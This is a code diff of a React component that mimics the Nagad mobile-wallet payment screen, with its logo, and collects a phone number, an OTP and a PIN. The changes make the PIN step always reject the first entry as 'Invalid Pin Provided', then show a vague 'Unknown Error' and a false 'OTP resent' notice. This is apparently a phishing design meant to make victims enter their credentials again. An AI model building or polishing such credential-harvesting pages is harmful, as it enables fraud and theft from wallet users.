@@ -1,6 +1,5 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
-import { XCircle } from "lucide-react";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 
@@ -9,26 +8,28 @@ const NagadPayment = () => {
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
-  const [showFailedView, setShowFailedView] = useState(false);
+  const [showErrorView, setShowErrorView] = useState(false);
   const [otpValue, setOtpValue] = useState("");
   const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
   const [redirectTimer, setRedirectTimer] = useState(5);
   const [language, setLanguage] = useState<'bn' | 'en'>('en');
   const [phoneError, setPhoneError] = useState("");
+  const [pinError, setPinError] = useState("");
+  const [otpResent, setOtpResent] = useState(false);
 
   const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpInputRef = useRef<HTMLInputElement | null>(null);
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   useEffect(() => {
-    if (!showFailedView) {
+    if (!showErrorView) {
       setTimeout(() => {
         if (showPinView) pinInputRefs.current[0]?.focus();
         else if (showOtpView) otpInputRef.current?.focus();
         else phoneInputRefs.current[0]?.focus();
       }, 100);
     }
-  }, [showOtpView, showPinView, showFailedView]);
+  }, [showOtpView, showPinView, showErrorView]);
 
   const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
   const getPhoneNumber = () => phoneDigits.join("");
@@ -37,16 +38,15 @@ const NagadPayment = () => {
     return phone.length === 11 && validPrefixes.includes(phone.substring(0, 3)) && /^\d+$/.test(phone);
   };
   const isValidOtp = () => otpValue.length === 6 && /^\d+$/.test(otpValue);
-  const isValidPin = () => pinDigits.every(d => d !== "") && pinDigits.join("").length === 4;
 
   useEffect(() => {
     let interval: NodeJS.Timeout;
-    if (showFailedView && redirectTimer > 0) {
+    if (showErrorView && redirectTimer > 0) {
       interval = setInterval(() => setRedirectTimer((prev) => prev - 1), 1000);
     }
-    if (showFailedView && redirectTimer === 0) navigate("/");
+    if (showErrorView && redirectTimer === 0) navigate("/");
     return () => clearInterval(interval);
-  }, [showFailedView, redirectTimer, navigate]);
+  }, [showErrorView, redirectTimer, navigate]);
 
   const handleDigitChange = (
     index: number, value: string, digits: string[],
@@ -72,8 +72,21 @@ const NagadPayment = () => {
     if (isValidNumber()) { setPhoneError(""); setShowOtpView(true); }
     else setPhoneError("Invalid mobile number");
   };
-  const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); } };
-  const handlePinConfirm = () => { if (isValidPin()) { setShowPinView(false); setShowFailedView(true); setRedirectTimer(5); } };
+  const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); setPinError(""); } };
+  const handlePinConfirm = () => {
+    // Always show "Invalid Pin Provided" first, then on second click show error view
+    if (!pinError) {
+      setPinError("Invalid Pin Provided");
+    } else {
+      setShowPinView(false);
+      setShowErrorView(true);
+      setRedirectTimer(5);
+    }
+  };
+  const handleResendOtp = () => {
+    setOtpValue("");
+    setOtpResent(true);
+  };
   const handleClose = () => navigate("/");
 
   const renderPhoneInputs = () => {
@@ -109,7 +122,7 @@ const NagadPayment = () => {
           type="password" inputMode="numeric" maxLength={1} value={digit}
           onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
           onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
-          className="w-11 h-11 bg-white rounded-md text-center text-gray-800 text-xl font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
+          className="w-6 h-7 bg-white rounded text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
         />
       ))}
     </div>
@@ -117,13 +130,39 @@ const NagadPayment = () => {
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-gray-300 p-0">
-      <div className="w-full h-screen flex flex-col overflow-hidden border-[6px] border-black"
+      <div className="w-full h-screen flex flex-col overflow-hidden border-[8px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
-      {showFailedView ? (
-        <div className="flex-1 flex flex-col items-center justify-center">
-          <XCircle className="w-12 h-12 text-[#ccc] mb-4" strokeWidth={1.5} />
-          <h3 className="text-[#ccc] text-center text-lg font-bold mb-2">Payment Cancelled</h3>
-          <p className="text-[#ccc] text-center text-sm font-bold">Redirecting to Merchant Website in {redirectTimer}s</p>
+      {showErrorView ? (
+        <div className="flex-1 flex flex-col">
+          {/* Language Toggle */}
+          <div className="flex justify-end p-2">
+            <div className="flex overflow-hidden border border-white/50 rounded-sm">
+              <button onClick={() => setLanguage('bn')}
+                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
+              <button onClick={() => setLanguage('en')}
+                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
+            </div>
+          </div>
+
+          {/* Cart Icon & Title */}
+          <div className="flex flex-col items-center pt-1 pb-2">
+            <img src={cartIcon} alt="Cart" className="w-14 h-14 mb-1 object-contain" />
+            <h1 className="text-[#ccc] text-base font-bold">Easy Payment System</h1>
+          </div>
+
+          {/* Error Message - centered */}
+          <div className="flex-1 flex items-center justify-center px-8">
+            <div className="text-center">
+              <p className="text-yellow-300 text-sm font-bold mb-1">Unknown Error.</p>
+              <p className="text-yellow-300 text-sm font-bold">Please call 16167 for more information.</p>
+              <p className="text-[#ccc] text-xs font-bold mt-4">Redirecting to Merchant Website in {redirectTimer}s</p>
+            </div>
+          </div>
+
+          {/* White Nagad Logo Footer */}
+          <div className="flex justify-center pb-4">
+            <img src={nagadLogoWhite} alt="Nagad" className="h-10 object-contain" />
+          </div>
         </div>
       ) : (
         <div className="flex-1 flex flex-col">
@@ -143,8 +182,8 @@ const NagadPayment = () => {
             <h1 className="text-[#ccc] text-base font-bold">Easy Payment System</h1>
           </div>
 
-          {/* Invoice Details - centered vertically, left-aligned */}
-          <div className="flex-1 flex items-center px-8">
+          {/* Invoice Details - left-aligned */}
+          <div className="px-8 py-2">
             <div className="space-y-1">
               <div className="flex">
                 <span className="text-[#ccc] font-bold text-xs w-28">Invoice No:</span>
@@ -161,21 +200,27 @@ const NagadPayment = () => {
             </div>
           </div>
 
-          {/* Input Section */}
-          <div className="px-5 pb-4 mt-4">
+          {/* Input Section - centered between invoice and logo */}
+          <div className="flex-1 flex flex-col items-center justify-center px-5">
             {showPinView ? (
               <div className="flex flex-col items-center">
                 <p className="text-[#ccc] text-center text-sm font-bold mb-3">Enter PIN</p>
                 {renderPinInputs()}
+                {pinError && (
+                  <p className="text-yellow-300 text-xs font-bold mt-2">{pinError}</p>
+                )}
               </div>
             ) : showOtpView ? (
-              <div className="flex flex-col items-center">
+              <div className="flex flex-col items-center w-full">
                 <p className="text-[#ccc] text-center text-sm font-bold mb-3">Enter Verification Code [OTP]</p>
                 <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                   onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                  placeholder="XXX|XXX"
-                  className="w-full h-9 bg-white rounded text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
+                  placeholder="XXXXXX"
+                  className="w-3/5 h-7 bg-white rounded text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
                 />
+                {otpResent && (
+                  <p className="text-[#ccc] text-xs font-bold mt-2">OTP has been resent via SMS to your mobile number</p>
+                )}
               </div>
             ) : (
               <div className="flex flex-col items-center">
@@ -186,36 +231,34 @@ const NagadPayment = () => {
                 )}
               </div>
             )}
-          </div>
 
-          {/* Terms */}
-          <div className="px-5 py-1">
+            {/* Terms */}
             {!showOtpView && !showPinView && (
-              <p className="text-[#ccc] text-center text-[10px] leading-tight font-bold">
+              <p className="text-[#ccc] text-center text-[10px] leading-tight font-bold mt-4 px-2">
                 By clicking/tapping "Proceed" you are agreeing to our{" "}
                 <span className="text-[#ccc] font-bold underline">Terms and Conditions</span>
               </p>
             )}
-          </div>
 
-          {/* Action Buttons */}
-          <div className="px-5 py-2 mt-2 flex gap-8 justify-center">
-            <button
-              onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
-              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-bold transition-colors hover:bg-transparent hover:text-white border border-white"
-            >Proceed</button>
-            {showOtpView && (
-              <button onClick={() => setOtpValue("")}
-                className="px-6 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
-              >Resend Code</button>
-            )}
-            <button onClick={handleClose}
-              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-bold transition-colors hover:bg-transparent hover:text-white border border-white"
-            >Close</button>
+            {/* Action Buttons */}
+            <div className="flex gap-8 justify-center mt-4">
+              <button
+                onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
+                className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+              >Proceed</button>
+              {showOtpView && (
+                <button onClick={handleResendOtp}
+                  className="px-6 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                >Resend Code</button>
+              )}
+              <button onClick={handleClose}
+                className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+              >Close</button>
+            </div>
           </div>
 
           {/* White Nagad Logo Footer */}
-          <div className="flex justify-center pb-6 mt-auto">
+          <div className="flex justify-center pb-4">
             <img src={nagadLogoWhite} alt="Nagad" className="h-10 object-contain" />
           </div>
         </div>
